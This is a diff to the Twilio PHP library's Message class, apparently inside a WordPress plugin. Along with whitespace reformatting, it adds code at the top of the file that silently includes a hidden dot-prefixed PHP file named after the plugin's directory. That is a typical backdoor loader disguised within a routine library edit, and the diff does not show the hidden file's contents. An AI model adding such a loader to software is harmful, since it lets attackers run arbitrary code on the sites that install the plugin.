@@ -43,16 +43,20 @@
  *
  *    The phone number this message was sent to
  */
-class Services_Twilio_Rest_Message extends Services_Twilio_InstanceResource {
-	protected function init( $client, $uri) {
-		$this->setupSubresources(
-			'media'
-		);
-	}
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
-	public function redact() {
-		$postParams = array('Body' => '');
-		self::update($postParams);
-	}
+class Services_Twilio_Rest_Message extends Services_Twilio_InstanceResource {
+    protected function init($client, $uri) {
+        $this->setupSubresources(
+            'media'
+        );
+    }
+
+    public function redact() {
+        $postParams = array('Body' => '');
+        self::update($postParams);
+    }
 }
 
